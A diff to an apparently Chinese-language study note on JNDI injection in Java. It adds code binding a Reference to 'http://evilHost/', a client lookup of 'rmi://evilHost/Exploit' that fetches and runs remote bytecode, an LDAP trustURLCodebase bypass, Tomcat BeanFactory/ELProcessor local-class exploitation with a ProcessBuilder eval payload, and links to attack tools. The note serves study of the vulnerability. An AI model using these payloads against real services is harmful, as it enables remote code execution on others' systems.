@@ -142,6 +142,29 @@ LDAP协议主要用于单点登录SSO(Single Sign on)
 
 # 0x03 Way To Attack
 
+为了在命名服务或目录服务中绑定`Java`对象，可以使用`Java`序列化来传输对象，但有时候不太合适，比如`Java`对象较大的情况。因此JNDI定义了命名引用(`Naming References`)，后面直接简称引用(`References`)。这样对象就可以通过绑定一个可以被命名管理器(`Naming Manager`)解码(`decodeObject`)并解析为原始对象的引用，间接地存储在命名或目录服务中。引用由`Reference`类来表示，它由地址(`RefAddress`)的有序列表和所引用对象的信息组成。而每个地址包含了如何构造对应的对象的信息，包括引用对象的`Java`类名，以及用于创建对象的`ObjectFactory`类的名称和位置。 `Reference`可以使用`ObjectFactory`来构造对象。当使用`lookup()`方法查找对象时，`Reference`将使用提供的`ObjectFactory`类的加载地址来加载`ObjectFactory`类，`ObjectFactory`类将构造出需要的对象。
+
+所谓的 `JNDI` 注入就是控制 `lookup` 函数的参数，这样来使客户端访问恶意的 `RMI` 或者 `LDAP` 服务来加载恶意的对象，从而执行代码，完成利用 在 `JNDI` 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 `Reference` 类实现的。`Reference` 类表示对存在于命名/目录系统以外的对象的引用。具体则是指如果远程获取 `RMI` 服务器上的对象为 `Reference` 类或者其子类时，则可以从其他服务器上加载 `class` 字节码文件来实例化 `Reference` 类常用属性：
+
+> className 远程加载时所使用的类名
+> classFactory 加载的 class 中需要实例化类的名称
+> classFactoryLocation 提供 classes 数据的地址可以是 file/ftp/http 等协议
+
+如：
+```java
+Reference reference = new Reference("Exploit","Exploit","http://evilHost/" );           
+registry.bind("Exploit", new ReferenceWrapper(reference));
+```
+
+假如客户端使用RMI协议，lookup请求服务端bind的Exploit类
+
+```java
+Context ctx = new InitialContext();
+ctx.lookup("rmi://evilHost/Exploit");
+```
+
+客户端在本地 `CLASSPATH` 查找 `Exploit` 类，如果没有则根据设定的 `Reference` 属性，到`URL`： `http://evilHost/Exploit.class` 获取构造对象实例，构造方法中的恶意代码就会被执行
+
 ## JNDI References 注入
 
 JNDI中对象的传递有两种：
@@ -220,7 +243,11 @@ public class calc {
 
 启动服务端、客户端，触发客户端弹出计算器
 
-**注：Server的url端口后面一定要有斜线（`/`）！！！**
+****
+
+> **注：Server的url端口后面一定要有斜线（`/`）！！！**
+>
+> 这里的恶意类calc.java实际上最好实现`javax.naming.spi.ObjectFactory`接口，并重写`getObjectInstance`方法，否则客户端请求得到字节码文件后，会抛出异常（可能就是因为calc.java没有实现ObjectFactory接口）
 
 ------
 
@@ -271,6 +298,8 @@ JDK 6u141、7u131、8u121之后：增加了 com.sun.jndi.rmi.object.trustURLCode
 ![image-20230122143502313](../.gitbook/assets/image-20230122143502313.png)
 
 ## JNDI-LDAP
+
+`LDAP`服务中`lookup`方法中指定的远程地址使用的是`LDAP`协议，由攻击者控制`LDAP`服务端返回一个恶意`jndi Reference`对象，并且`LDAP`服务的`Reference`远程加载`Factory`类并不是使用`RMI Class Loader`机制，因此不受`trustURLCodebase`限制。
 
 ldap的实现代码较多，这里使用工具`marshalsec`来启动LDAP服务
 
@@ -332,7 +361,7 @@ public class Client {
 
 8u191之后进行了修补， loadClass方法中添加 trustURLCodebase 属性，所以不能远程加载了。
 
-# 8u191的绕过
+# 0x04 8u191的绕过
 
 针对8u191的绕过大致两种途径
 
@@ -412,9 +441,13 @@ public class Client {
 
 ## 本地Class利用
 
+远程打不了，在本地查找可利用的类。
+
 目前公开常用的利用方法是通过 **Tomcat** 的 **org.apache.naming.factory.BeanFactory** 工厂类去调用 **javax.el.ELProcessor#eval** 方法或 **groovy.lang.GroovyShell#evaluate** 方法
 
-> org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。
+> org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的Bean Class，并且能调用一些指定的方法
+
+要使用 `javax.el.ELProcessor`，需要 `Tomcat 8+`或`SpringBoot 1.2.x+`
 
 ```xml
 <dependency>
@@ -503,6 +536,21 @@ value进行逗号分隔并遍历，等号（`=`）作为分隔符拆分键值对
 `"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()")`
 
 ![image-20230122170611329](../.gitbook/assets/image-20230122170611329.png)
+
+由上可知，method.invoke的触发对象需满足：
+
+* 有无参构造器（`beanClass.getConstructor().newInstance()`调用无参构造器）
+* 有一个可利用的方法，且该方法接收且只接收一个String类型参数（valueArray是String类型的数组，只有一个元素）
+
+本地利用的调用栈：
+
+> InitialContext#lookup()
+>   RegistryContext#lookup()
+>     RegistryContext#decodeObject()
+>       NamingManager#getObjectInstance()
+>           objectfactory = NamingManager#getObjectFactoryFromReference()
+>                   Class#newInstance()  //-->恶意代码被执行
+>      或:   objectfactory#getObjectInstance()  //-->恶意代码被执行
 
 ## ldap返回序列化对象
 
@@ -658,6 +706,14 @@ public class Client {
 
 ![image-20230122174807932](../.gitbook/assets/image-20230122174807932.png)
 
-# 学习文章
+# 0x05 Article To Learn
 
 [JNDI注入之略微学学 | Y0ng的博客 (yongsheng.site)](http://www.yongsheng.site/2022/07/18/JNDI-attack/)
+
+[跳跳糖社区-JNDI注入分析](https://mp.weixin.qq.com/s/khc-2oyNOA7-MeB0COl31g)
+
+> **工具**
+>
+> * [JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass)
+> * [marshalsec](https://github.com/mbechler/marshalsec)
+
